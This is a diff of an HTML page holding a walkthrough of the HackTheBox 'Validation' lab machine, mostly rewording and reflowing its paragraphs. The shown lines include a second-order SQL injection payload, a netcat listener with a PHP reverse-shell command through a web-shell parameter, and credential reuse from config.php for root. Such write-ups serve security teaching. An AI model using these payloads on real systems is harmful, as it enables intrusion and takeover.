@@ -10,7 +10,8 @@
         gtag('js', new Date());
         gtag('config', 'G-GTPQRVRV1B');
     </script>
-    <meta name="description" content="Walkthrough of HackTheBox Validation | An Easy rated Linux machine for beginners.">
+    <meta name="description"
+        content="Walkthrough of HackTheBox Validation | An Easy rated Linux machine for beginners.">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
     <link rel="icon" href="/favicon.png" />
@@ -184,8 +185,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</pre>
                                 </div>
                             </div>
                             <img src="/htb/Validation/5.png" alt="tried for SQL injection in country input">
-                            <p>It's a hit, it seems to be a second order SQL injection as the input is being stored and
-                                still not being properly parsed when being used.</p>
+                            <p>It's a hit, it seems to be a second order SQL injection </p>
+                            <p>The input is being stored and when used its not being parsed properly.</p>
                             <p>But the injected query failed for some reason.</p>
                             <p>Trying the same query again with a different username and country made it work.</p>
                             <!-- Code Snippet -->
@@ -256,8 +257,7 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <div class="card s-rounded code-card">
                                 <div class="card-body">
                                     <!-- change the special chars -->
-                                    <pre
-                                        class="code-p">nc -lnvp 4444
+                                    <pre class="code-p">nc -lnvp 4444
 
 ?cmd=php -r '$sock=fsockopen("10.10.14.20",4444);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</pre>
                                 </div>
@@ -271,8 +271,10 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <img src="/htb/Validation/13.png" alt="user flag">
                             <h2 id="root">Privilege Escalation</h2>
                             <p>Getting the root flag on this machine was pretty easy.</p>
-                            <p>There was no need much enumeration, the credentials file was right where we landed when we got the shell!</p>
-                            <p>Let's got to the <code>html</code> directory and look into <code>config.php</code> file.</p>
+                            <p>There isn't much need for enumeration here</p>
+                            <p>credentials file was right where we landed when we got the shell!</p>
+                            <p>Let's got to the <code>html</code> directory and look into <code>config.php</code> file.
+                            </p>
                             <img src="/htb/Validation/14.png" alt="config file exploration">
                             <p>Here we have credentails to connect to sql server for user <code>uhc</code></p>
                             <p>Let's try to use these credentials to access root user.</p>
@@ -280,15 +282,19 @@ username=utkc2&country=Algeria' UNION SELECT user() #
                             <p>It worked!</p>
                             <p>We got the root flag.</p>
                             <h2>Lesson Learned</h2>
-                            <p>HackTheBox: Validation is an Easy Linux Box that is good for beginners to practice their SQL injection skills.</p>
-                            <p>This box seems to be focused on Web Penetration and is pretty relaxed on the Privesc side.</p>
-                            <p>Here are some takeaways:</p>
+                            <p>HackTheBox: Validation is an Easy Linux Box that is good for beginners to practice their
+                                SQL injection skills.</p>
+                            <p>This box seems to be focused on Web Penetration and is pretty relaxed on the Privesc
+                                side.</p>
+                            <p>Here are some takeaways from this Writeup:</p>
                             <ul>
                                 <li>
-                                    <p>Second order SQL injections are just properly stored SQL queries which are used later by the application in an unsafe manner.</p>
+                                    <p>Second order SQL injections are just properly stored SQL queries which are used
+                                        later on in the application in an unsafe manner.</p>
                                 </li>
                                 <li>
-                                    <p>Always hunt for clear text passwords. If you find a password in CTF's, it probably was meant to be there for a reason.</p>
+                                    <p>Always hunt for clear text passwords.</p> 
+                                    <p>If you find a password in a CTF, it is meant to be there for a reason.</p>
                                 </li>
                             </ul>
 
